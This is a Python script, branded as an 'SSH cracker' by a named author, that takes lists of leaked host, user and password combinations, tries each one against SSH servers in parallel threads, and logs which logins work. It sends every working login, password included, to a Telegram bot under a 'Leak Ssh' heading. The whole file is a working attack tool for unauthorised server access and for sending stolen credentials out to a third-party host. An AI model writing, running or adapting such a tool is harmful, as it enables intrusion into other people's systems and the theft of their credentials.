import os
import paramiko
from rich.console import Console
from datetime import datetime
import threading
import time
from telegram import Bot
from telegram.error import TelegramError
import asyncio
from pystyle import Colors, Colorate, Center

# Constantes pour les couleurs
COLOR_YELLOW = "\033[1;33m"
COLOR_WHITE = "\033[1;37m"
COLOR_BLUE = "\033[1;34m"
COLOR_GREEN = "\033[1;32m"
COLOR_RED = "\033[1;31m"
COLOR_RESET = "\033[0m"

# Constantes pour les paramètres
MAX_THREADS = 10  # Nombre maximal de threads simultanés
DELAY_BETWEEN_ATTEMPTS = 1  # Délai en secondes entre les tentatives de connexion

# Configuration Telegram
TELEGRAM_BOT_TOKEN = ""  # Remplacez par votre token
TELEGRAM_CHAT_ID = ""  # Remplacez par l'ID du chat

def clear_terminal():
    """Efface le terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Affiche la bannière du programme."""
    banner = """
         .-.
       .'   `.          ----------------------------
       :g g   :         |GHOST - SSH CRACKER LOGIN |  
       : o    `.        |      @CODE BY HackFut    |
      :         ``.     ----------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'
      🅜🅐🅢🅢 🅒🅗🅔🅒🅚🅔🅡🅢 🅜🅐🅢🅢 🅒🅗🅔🅒🅚🅔🅡🅢"""

    description = """
This program allows testing SSH combinations from an input file.

It supports the following formats:
- hostname:username:password
- hostname:port:username:password
- hostname;user;password
- user:password:hostname:port
- user;password;hostname
- user:port:password:hostname

Dependance: 

pip install paramiko python-telegram-bot rich pystyle

Successful connections are saved in 'Good_Ssh.txt'.
Failed connections are saved in 'Bad_Ssh.txt'.
Results are also sent to Telegram.

"""
    print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(banner)))
    print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(description)))

def check_ssh_login(hostname, port, user, password):
    """Vérifie si une connexion SSH est possible avec les identifiants fournis."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname, port=int(port), username=user, password=password, timeout=10)
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, Exception) as e:
        return False

async def send_to_telegram(hostname, port, user, password):
    """Envoie les informations de connexion réussie sur Telegram."""
    try:
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        message = (
            "🚀 w0ot Leak Ssh\n"
            f"Hostname: {hostname}\n"
            f"Port: {port}\n"
            f"Username: {user}\n"
            f"Password: {password}\n"
            f"Permission: {user}"
        )
        await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)  # Utilisation de await
    except TelegramError as e:
        print(f"[{COLOR_RED}Error sending to Telegram{COLOR_RESET}]: {e}")

def process_ssh_line(line, good_outfile, bad_outfile, counter):
    """Traite une ligne du fichier d'entrée et tente une connexion SSH."""
    # Supprimer les espaces et les sauts de ligne
    line = line.strip()

    # Détecter le format et extraire les informations
    if ':' in line:
        parts = line.split(':')
        if len(parts) == 3:
            # Format hostname:username:password (port par défaut : 22)
            hostname, user, password = parts
            port = 22
        elif len(parts) == 4:
            # Format hostname:port:username:password ou user:password:hostname:port
            if parts[0].isdigit():  # Si la première partie est un port
                port, password, hostname, user = parts
            else:
                hostname, port, user, password = parts
        elif len(parts) == 4 and parts[1].isdigit():
            # Format user:port:password:hostname
            user, port, password, hostname = parts
        else:
            print(f"[{COLOR_RED}Invalid line format{COLOR_RESET}]: {line}")
            return
    elif ';' in line:
        # Format hostname;user;password ou user;password;hostname
        parts = line.split(';')
        if len(parts) == 3:
            if parts[0].isdigit():  # Si la première partie est un port
                port, password, hostname = parts
                user = "root"  # Utilisateur par défaut
            else:
                hostname, user, password = parts
                port = 22
        else:
            print(f"[{COLOR_RED}Invalid line format{COLOR_RESET}]: {line}")
            return
    else:
        print(f"[{COLOR_RED}Invalid line format{COLOR_RESET}]: {line}")
        return

    # Tester la connexion SSH
    success = check_ssh_login(hostname, port, user, password)
    current_time = datetime.now().strftime("%H:%M:%S")

    if success:
        good_outfile.write(line + "\n")
        print(f"[{COLOR_YELLOW}{current_time}{COLOR_RESET}] - [{COLOR_WHITE}{hostname}{COLOR_RESET}] - [{COLOR_BLUE}{port}{COLOR_RESET}] - [{COLOR_BLUE}{user}{COLOR_RESET}] - [{COLOR_BLUE}{password}{COLOR_RESET}] - [{COLOR_BLUE}Permission: {user}{COLOR_RESET}] - [{COLOR_GREEN}Success{COLOR_RESET}]")
        counter['good'] += 1
        # Envoyer les informations sur Telegram
        asyncio.run(send_to_telegram(hostname, port, user, password))
    else:
        bad_outfile.write(line + "\n")
        print(f"[{COLOR_YELLOW}{current_time}{COLOR_RESET}] - [{COLOR_WHITE}{hostname}{COLOR_RESET}] - [{COLOR_BLUE}{port}{COLOR_RESET}] - [{COLOR_BLUE}{user}{COLOR_RESET}] - [{COLOR_BLUE}{password}{COLOR_RESET}] - [{COLOR_RED}Failed{COLOR_RESET}]")
        counter['bad'] += 1

def process_ssh_file(input_file):
    """Traite le fichier d'entrée et teste les connexions SSH."""
    good_file = "Good_Ssh.txt"
    bad_file = "Bad_Ssh.txt"
    counter = {'good': 0, 'bad': 0}

    if not os.path.exists(input_file):
        print(f"[{COLOR_RED}Error{COLOR_RESET}]: File '{input_file}' not found.")
        return

    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile:
            with open(good_file, 'w', encoding='utf-8') as good_outfile, \
                 open(bad_file, 'w', encoding='utf-8') as bad_outfile:
                threads = []
                for line in infile:
                    while threading.active_count() >= MAX_THREADS:
                        time.sleep(0.1)
                    thread = threading.Thread(target=process_ssh_line, args=(line, good_outfile, bad_outfile, counter))
                    thread.start()
                    threads.append(thread)
                    time.sleep(DELAY_BETWEEN_ATTEMPTS)

                for thread in threads:
                    thread.join()

        print(f"[{COLOR_GREEN}Success{COLOR_RESET}]: Good SSH logins saved to '{good_file}'.")
        print(f"[{COLOR_RED}Failed{COLOR_RESET}]: Bad SSH logins saved to '{bad_file}'.")
        print(f"[{COLOR_BLUE}Summary{COLOR_RESET}]: Good: {counter['good']}, Bad: {counter['bad']}")
    except Exception as e:
        print(f"[{COLOR_RED}Error{COLOR_RESET}]: {e}")

def main():
    """Fonction principale du programme."""
    clear_terminal()
    print_banner()
    input_file = input(f"\n[] {COLOR_BLUE}Enter The List {COLOR_YELLOW}: {COLOR_WHITE}")
    process_ssh_file(input_file)

if __name__ == "__main__":
    main()